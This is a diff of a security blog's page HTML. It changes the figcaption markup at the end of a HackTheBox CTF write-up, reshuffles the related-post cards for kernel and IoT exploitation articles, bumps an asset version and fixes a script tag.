-ctf</code></pre><figcaption>Output of the exploit</figcaption></figure><p>Thanks for reading my write-up about the HackTheBox Business CTF 2022 Superfast challenge; I hope you learned as much as I did.</p>
+ctf</code></pre><figcaption><p><span style="white-space: pre-wrap;">Output of the exploit</span></p></figcaption></figure><p>Thanks for reading my write-up about the HackTheBox Business CTF 2022 Superfast challenge; I hope you learned as much as I did.</p>
     </section>
 
 
@@ -585,6 +582,34 @@ ctf</code></pre><figcaption>Output of the exploit</figcaption></figure><p>Thanks
 
             <aside class="read-more-wrap outer">
                 <div class="read-more inner">
+                        
+<article class="post-card post featured no-image">
+
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/nftables/">
+            <header class="post-card-header">
+                <div class="post-card-tags">
+                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+</svg> Featured</span>
+                </div>
+                <h2 class="post-card-title">
+                    Flipping Pages: An analysis of a new Linux vulnerability in nf_tables and hardened exploitation techniques
+                </h2>
+            </header>
+                <div class="post-card-excerpt">A tale about exploiting KernelCTF Mitigation, Debian, and Ubuntu instances with a double-free in nf_tables in the Linux kernel, using novel techniques like Dirty Pagedirectory. All without even having to recompile the exploit for different kernel targets once.</div>
+        </a>
+
+        <footer class="post-card-meta">
+            <time class="post-card-meta-date" datetime="2024-03-26">Mar 26, 2024</time>
+                <span class="post-card-meta-length">77 min read</span>
+        </footer>
+
+    </div>
+
+</article>
                         
 <article class="post-card post featured no-image">
 
@@ -627,7 +652,7 @@ ctf</code></pre><figcaption>Output of the exploit</figcaption></figure><p>Thanks
 </svg> Featured</span>
                 </div>
                 <h2 class="post-card-title">
-                    Unleashing ksmbd: remote exploitation of the Linux kernel (ZDI-23-979, ZDI-23-980)
+                    Unleashing ksmbd: crafting remote exploits of the Linux kernel
                 </h2>
             </header>
                 <div class="post-card-excerpt">December 22nd 2022: it's Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of ZDI-22-1690, an</div>
@@ -636,31 +661,6 @@ ctf</code></pre><figcaption>Output of the exploit</figcaption></figure><p>Thanks
         <footer class="post-card-meta">
             <time class="post-card-meta-date" datetime="2023-08-04">Aug 4, 2023</time>
                 <span class="post-card-meta-length">10 min read</span>
-        </footer>
-
-    </div>
-
-</article>
-                        
-<article class="post-card post no-image">
-
-
-    <div class="post-card-content">
-
-        <a class="post-card-content-link" href="/cve-2022-46640/">
-            <header class="post-card-header">
-                <div class="post-card-tags">
-                </div>
-                <h2 class="post-card-title">
-                    How I hacked IoT management apps: the story behind CVE-2022-46640
-                </h2>
-            </header>
-                <div class="post-card-excerpt">Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost,</div>
-        </a>
-
-        <footer class="post-card-meta">
-            <time class="post-card-meta-date" datetime="2023-03-08">Mar 8, 2023</time>
-                <span class="post-card-meta-length">8 min read</span>
         </footer>
 
     </div>
@@ -731,7 +731,7 @@ ctf</code></pre><figcaption>Output of the exploit</figcaption></figure><p>Thanks
     integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
     crossorigin="anonymous">
 </script>
-<script src="/assets/built/casper.js?v=c45f525af4"></script>
+<script src="/assets/built/casper.js?v=484755abd6"></script>
 <script>
 $(document).ready(function () {
     // Mobile Menu Trigger
@@ -764,7 +764,7 @@ $(document).ready(function () {
 <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-makefile.min.js" integrity="sha512-9MXjDxOwWNLJZRSwZRFdc1lvSIxld5c9DeLhySKjTAIEpj8a48Kezdc/hKjUsyD8S+oa3a+5SpuqdcCFodSI3Q==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markdown.min.js" integrity="sha512-IHQR8J+JbQpZ1tjkHkq8Ivsgo6ovfnYbQnYzmoKCjTCQG90YVs9l+2P14DRIZ94VBrB+F86Ju4wSGOMOjfVCQQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
-<script data-goatcounter="https://french5937.goatcounter.com/count" async src="//gc.zgo.at/count.js" />
+<script data-goatcounter="https://french5937.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
 
 <script>
     $("pre").addClass("line-numbers");
